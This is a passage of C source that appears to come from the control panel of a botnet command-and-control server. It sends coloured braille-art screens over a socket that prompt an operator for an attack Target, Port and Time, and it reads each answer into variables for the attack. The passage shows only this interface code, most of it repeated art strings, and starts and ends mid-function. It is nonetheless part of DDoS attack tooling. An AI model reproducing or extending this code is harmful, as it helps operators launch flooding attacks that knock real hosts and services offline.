\t"CY"║"CR"⣿⣿⣿⣦⣛⣼⣿⣿⣿⣬⣘⣥⣬⣵⣾⣿⣮⣤⣿⣿⣷⡘⢿⡟⣿⣿⣿"CY"║║ Port ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⠛⠛⠛⠛⠛⣿⠛⠛⠛⠛⠛⠛⠛⣻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⡄⠀⢶⣶⡾⠁⠀⠰⣶⣶⡖⠀⣰⣿⣿⣿⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⡄⠈⠿⠁⢠⣷⡀⠙⣏⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Time ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⣀⣀⣀⣀⣀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⢿⣿⣿⣏⠀⢻⣿⠏⢀⣼⣿⣿⡿⢻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡇⠀⠙⢿⣿⣆⠀⠃⢀⣾⣿⡿⠋⠀⢸⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣧⣤⣤⣤⣽⣿⣧⢀⣾⣿⣯⣤⣤⣤⣼⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"╚═══════════════════════════╝"CR"\r\n                                "CY"╔══╣\x1b[4mPort\x1b[24m║\r\n          \t\t\t╚═» ", mytarg, myport, mysecs);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            } else if(atk_wtng == 5){
                sprintf(vivid, ""CLS"\r\n\r\n                       \t"CY"╔═══════════════════════════╗╔════════╗"CR"\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Target ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⠟⠉⣀⡐⢨⣭⡋⢛⢛⢛⡛⠙⠿⢛⠛⠻⣿⣿⣿⣿"CY"║╚════════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡧⡁⠀⣭⣤⣾⡟⠀⣸⢟⣩⡔⠀⢼⡟⣷⠀⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⢫⣴⠁⣿⠀⠹⢫⡭⠁⡐⣏⠺⡛⠀⣴⣶⣶⡟⢀⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣧⢸⢁⣑⡛⠀⠀⣿⡇⣰⣟⣿⢡⠀⠀⣛⡛⠛⠠⢾⣿⣿⣿⣿"CY"║║ Port ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣯⣥⣭⣉⣥⣶⣵⣮⣥⣿⣿⣿⣷⣄⣭⣭⣴⣾⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⠛⠛⠛⠛⠛⣿⠛⠛⠛⠛⠛⠛⠛⣻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⡄⠀⢶⣶⡾⠁⠀⠰⣶⣶⡖⠀⣰⣿⣿⣿⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⡄⠈⠿⠁⢠⣷⡀⠙⣏⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Time ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⣀⣀⣀⣀⣀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⢿⣿⣿⣏⠀⢻⣿⠏⢀⣼⣿⣿⡿⢻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡇⠀⠙⢿⣿⣆⠀⠃⢀⣾⣿⡿⠋⠀⢸⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣧⣤⣤⣤⣽⣿⣧⢀⣾⣿⣯⣤⣤⣤⣼⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"╚═══════════════════════════╝"CR"\r\n                                "CY"╔══╣\x1b[4mPort\x1b[24m║\r\n          \t\t\t╚═» ", mytarg, myport, mysecs);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            } else if(atk_wtng == 6){
                sprintf(vivid, ""CLS"\r\n\r\n                       \t"CY"╔═══════════════════════════╗╔════════╗"CR"\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Target ║\r\n                   \t"CY"║"CR"⣿⣿⡟⠘⣿⠟⣉⡴⡋⢨⢻⡿⠃⣽⣿⡿⢟⡫⢀⢸⣿⣿⠋⢰⣦⣶⣿"CY"║╚════════╝\r\n                   \t"CY"║"CR"⣿⣟⣵⢆⠐⣭⠩⡚⠁⣼⣈⠅⢀⡽⠑⠛⢁⠴⠩⡚⣭⠅⡇⠘⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⡿⣣⣿⡇⢟⣖⠇⣶⣙⣿⠰⣻⠲⢃⣦⣿⣇⠟⣱⣃⠾⢃⣠⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Port ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⠛⠛⠛⠛⠛⣿⠛⠛⠛⠛⠛⠛⠛⣻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⡄⠀⢶⣶⡾⠁⠀⠰⣶⣶⡖⠀⣰⣿⣿⣿⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⡄⠈⠿⠁⢠⣷⡀⠙⣏⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Time ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⣀⣀⣀⣀⣀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⢿⣿⣿⣏⠀⢻⣿⠏⢀⣼⣿⣿⡿⢻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡇⠀⠙⢿⣿⣆⠀⠃⢀⣾⣿⡿⠋⠀⢸⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣧⣤⣤⣤⣽⣿⣧⢀⣾⣿⣯⣤⣤⣤⣼⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"╚═══════════════════════════╝"CR"\r\n                                "CY"╔══╣\x1b[4mPort\x1b[24m║\r\n          \t\t\t╚═» ", mytarg, myport, mysecs);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            } else if(atk_wtng == 7){
                sprintf(vivid, ""CLS"\r\n\r\n                       \t"CY"╔═══════════════════════════╗╔════════╗"CR"\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⠿⣿⣿⣿⣿⢟⡍⣿⣿⣿⡿⠿⠿⢿⣿⣿⡿⠿⣿⠿⣿⣿⣿"CY"║║ Target ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣼⡈⢻⣿⡇⠏⢠⣿⡿⡁⠀⣿⣧⣬⡟⢁⣤⣛⣛⣥⣾⣿⣿"CY"║╚════════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣟⣾⡇⢸⡟⠁⡠⢛⣛⢣⡇⠀⣿⣿⠿⠂⢈⣻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⡇⠘⢠⣾⢰⡿⠯⣣⣿⠀⢸⠁⣠⣾⠿⠿⢿⣿⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣧⡀⣿⣿⡮⡣⠾⠶⠂⣠⡎⠀⢭⣶⠿⣋⣼⣿⣿⣿⣿⣿"CY"║║ Port ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⠛⠛⠛⠛⠛⣿⠛⠛⠛⠛⠛⠛⠛⣻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⡄⠀⢶⣶⡾⠁⠀⠰⣶⣶⡖⠀⣰⣿⣿⣿⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⡄⠈⠿⠁⢠⣷⡀⠙⣏⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Time ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⣀⣀⣀⣀⣀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⢿⣿⣿⣏⠀⢻⣿⠏⢀⣼⣿⣿⡿⢻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡇⠀⠙⢿⣿⣆⠀⠃⢀⣾⣿⡿⠋⠀⢸⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣧⣤⣤⣤⣽⣿⣧⢀⣾⣿⣯⣤⣤⣤⣼⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"╚═══════════════════════════╝"CR"\r\n                                "CY"╔══╣\x1b[4mPort\x1b[24m║\r\n          \t\t\t╚═» ", mytarg, myport, mysecs);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            } else if(atk_wtng == 8){
                sprintf(vivid, ""CLS"\r\n\r\n                       \t"CY"╔═══════════════════════════╗╔════════╗"CR"\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Target ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⡿⠿⠿⠛⣩⣵⢌⣿⣿⠃⢙⢿⣿⣿⠸⠿⠿⠛⣩⣶⢌⣿⣿"CY"║╚════════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⡾⠋⣠⣬⣭⣷⡿⣫⡶⠁⣸⢸⡿⠃⡸⠋⣠⣬⣭⣶⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⡿⠁⣰⣿⡿⠟⠋⠾⡙⠁⣰⣿⢸⠁⡐⠀⣼⣿⠿⠛⢻⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣧⠀⢟⣵⡾⢋⣆⢾⡆⣰⣹⣿⠀⣸⣇⠀⢋⣵⡿⣫⣾⣿⣿⣿"CY"║║ Port ║\r\n                   \t"CY"║"CR"⣿⣿⣟⣛⣤⣤⣥⣾⣿⣿⣦⣅⣿⣿⣿⣦⣟⣫⣤⣤⣵⣾⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⠛⠛⠛⠛⠛⣿⠛⠛⠛⠛⠛⠛⠛⣻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⡄⠀⢶⣶⡾⠁⠀⠰⣶⣶⡖⠀⣰⣿⣿⣿⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⡄⠈⠿⠁⢠⣷⡀⠙⣏⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Time ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⣀⣀⣀⣀⣀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⢿⣿⣿⣏⠀⢻⣿⠏⢀⣼⣿⣿⡿⢻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡇⠀⠙⢿⣿⣆⠀⠃⢀⣾⣿⡿⠋⠀⢸⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣧⣤⣤⣤⣽⣿⣧⢀⣾⣿⣯⣤⣤⣤⣼⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"╚═══════════════════════════╝"CR"\r\n                                "CY"╔══╣\x1b[4mPort\x1b[24m║\r\n          \t\t\t╚═» ", mytarg, myport, mysecs);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            }
            if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
            sprintf(myport, "%s", buf);
            Trim(myport);
            memset(buf, 0, sizeof(buf));
            if(atk_wtng == 1){
                sprintf(vivid, ""CLS"\r\n\r\n                       \t"CY"╔═══════════════════════════╗╔════════╗"CR"\r\n                   \t"CY"║"CR"⣿⣿⣿⡿⢿⣿⣿⡿⢿⣿⣿⣿⡿⣿⣿⡿⣿⣿⣿⣿⣿⣿⠿⣿⠿⠿⣿"CY"║║ Target ║\r\n                   \t"CY"║"CR"⣿⣿⣿⠃⢸⣿⣿⡇⠈⣿⠿⣛⠅⢈⣴⣶⡄⠙⣿⣿⡿⣋⠀⣱⣶⡆⢹"CY"║╚════════╝\r\n                   \t"CY"║"CR"⣧⣨⠅⠀⣼⠿⡟⠀⠄⣵⣾⠏⠀⣜⣛⣽⡇⢀⢛⡵⢪⠁⢀⡬⠟⢀⣾"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⡏⢀⣼⣯⠊⠀⢈⣶⡬⡊⠀⣾⣿⣿⡟⢁⣆⠛⣩⠀⢠⣭⣵⣶⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⡇⢼⡿⢫⠀⣼⣿⣿⡜⠀⣦⡵⠖⣂⣤⣿⣽⡹⢿⢠⣷⣿⣿⣿⣿⣿"CY"║║ Port ║\r\n                   \t"CY"║"CR"⣿⣿⣶⣾⣿⣷⣶⣿⣿⣿⣷⣶⣾⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⠛⠛⠛⠛⠛⣿⠛⠛⠛⠛⠛⠛⠛⣻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⡄⠀⢶⣶⡾⠁⠀⠰⣶⣶⡖⠀⣰⣿⣿⣿⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⡄⠈⠿⠁⢠⣷⡀⠙⣏⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Time ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⣀⣀⣀⣀⣀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⢿⣿⣿⣏⠀⢻⣿⠏⢀⣼⣿⣿⡿⢻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡇⠀⠙⢿⣿⣆⠀⠃⢀⣾⣿⡿⠋⠀⢸⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣧⣤⣤⣤⣽⣿⣧⢀⣾⣿⣯⣤⣤⣤⣼⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"╚═══════════════════════════╝"CR"\r\n                                "CY"╔══╣\x1b[4mTime\x1b[24m║\r\n          \t\t\t╚═» ", mytarg, myport, mysecs);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            } else if(atk_wtng == 2){
                sprintf(vivid, ""CLS"\r\n\r\n                       \t"CY"╔═══════════════════════════╗╔════════╗"CR"\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Target ║\r\n                   \t"CY"║"CR"⣿⣿⣿⡿⢿⠛⢛⣿⠿⢿⣿⣿⣿⢿⡿⢿⣿⣿⡿⣿⠿⢿⣿⣿⣿⣿⣿"CY"║╚════════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣧⣛⣛⣣⣾⡟⢀⣢⡤⢀⣴⣞⣣⠿⣫⠀⣵⣷⠈⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⡿⣫⡍⢀⢺⠋⣰⣿⡿⠟⡵⠏⠂⠰⣝⣡⣾⣿⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣇⢿⢀⣾⣿⠀⢫⡷⢟⣥⢶⡇⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Port ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣷⣾⣿⣽⣶⣶⣾⣿⣿⣿⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⠛⠛⠛⠛⠛⣿⠛⠛⠛⠛⠛⠛⠛⣻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⡄⠀⢶⣶⡾⠁⠀⠰⣶⣶⡖⠀⣰⣿⣿⣿⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⡄⠈⠿⠁⢠⣷⡀⠙⣏⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Time ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⣀⣀⣀⣀⣀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⢿⣿⣿⣏⠀⢻⣿⠏⢀⣼⣿⣿⡿⢻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡇⠀⠙⢿⣿⣆⠀⠃⢀⣾⣿⡿⠋⠀⢸⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣧⣤⣤⣤⣽⣿⣧⢀⣾⣿⣯⣤⣤⣤⣼⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"╚═══════════════════════════╝"CR"\r\n                                "CY"╔══╣\x1b[4mTime\x1b[24m║\r\n          \t\t\t╚═» ", mytarg, myport, mysecs);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            } else if(atk_wtng == 3){
                sprintf(vivid, ""CLS"\r\n\r\n                       \t"CY"╔═══════════════════════════╗╔════════╗"CR"\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Target ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⠟⢉⣭⢉⡌⢹⣿⣿⠙⣿⣿⡿⠉⢻⣿⣿⠙⣿⣿⣿"CY"║╚════════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⡿⠿⠏⡆⠈⣿⠏⢠⣾⣿⠏⢠⢟⣭⠎⢀⠎⣿⠃⢰⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⡏⡴⠿⢄⣷⠀⠋⢰⡿⠟⠁⡠⡇⠣⠁⠀⣾⢸⠃⣰⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⡷⢜⠰⠷⠂⣠⡕⣢⡌⢀⣶⣾⣧⡻⢠⣧⣿⣎⢰⣿⣿⣿⣿⣿"CY"║║ Port ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⠸⣿⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⠛⠛⠛⠛⠛⣿⠛⠛⠛⠛⠛⠛⠛⣻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⡄⠀⢶⣶⡾⠁⠀⠰⣶⣶⡖⠀⣰⣿⣿⣿⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⡄⠈⠿⠁⢠⣷⡀⠙⣏⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Time ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⣀⣀⣀⣀⣀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⢿⣿⣿⣏⠀⢻⣿⠏⢀⣼⣿⣿⡿⢻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡇⠀⠙⢿⣿⣆⠀⠃⢀⣾⣿⡿⠋⠀⢸⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣧⣤⣤⣤⣽⣿⣧⢀⣾⣿⣯⣤⣤⣤⣼⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"╚═══════════════════════════╝"CR"\r\n                                "CY"╔══╣\x1b[4mTime\x1b[24m║\r\n          \t\t\t╚═» ", mytarg, myport, mysecs);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            } else if(atk_wtng == 4){
                sprintf(vivid, ""CLS"\r\n\r\n                       \t"CY"╔═══════════════════════════╗╔════════╗"CR"\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Target ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⠿⡛⠁⡌⣟⣛⠛⠩⠶⣢⡿⢟⠈⡿⠋⣴⣶⣿⣿⣿"CY"║╚════════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⡟⠕⠾⠋⣠⡺⡱⡞⢁⣾⣿⣿⠩⠊⠃⠘⣡⣾⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⢟⣡⠀⡠⡶⢮⢡⡺⠀⠞⣫⡶⣠⢡⠂⣤⣷⡈⢿⣿⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣦⣛⣼⣿⣿⣿⣬⣘⣥⣬⣵⣾⣿⣮⣤⣿⣿⣷⡘⢿⡟⣿⣿⣿"CY"║║ Port ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⠛⠛⠛⠛⠛⣿⠛⠛⠛⠛⠛⠛⠛⣻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⡄⠀⢶⣶⡾⠁⠀⠰⣶⣶⡖⠀⣰⣿⣿⣿⣿⣿⣿⣿"CY"║╔══════╗\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⡄⠈⠿⠁⢠⣷⡀⠙⣏⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿"CY"║║ Time ║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⣀⣀⣀⣀⣀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║╚══════╝\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡟⢿⣿⣿⣏⠀⢻⣿⠏⢀⣼⣿⣿⡿⢻⣿⣿⣿⣿⣿⣿"CY"║»"CR"%s\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⡇⠀⠙⢿⣿⣆⠀⠃⢀⣾⣿⡿⠋⠀⢸⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣧⣤⣤⣤⣽⣿⣧⢀⣾⣿⣯⣤⣤⣤⣼⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"║"CR"⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"CY"║\r\n                   \t"CY"╚═══════════════════════════╝"CR"\r\n                                "CY"╔══╣\x1b[4mTime\x1b[24m║\r\n          \t\t\t╚═» ", mytarg, myport, mysecs);
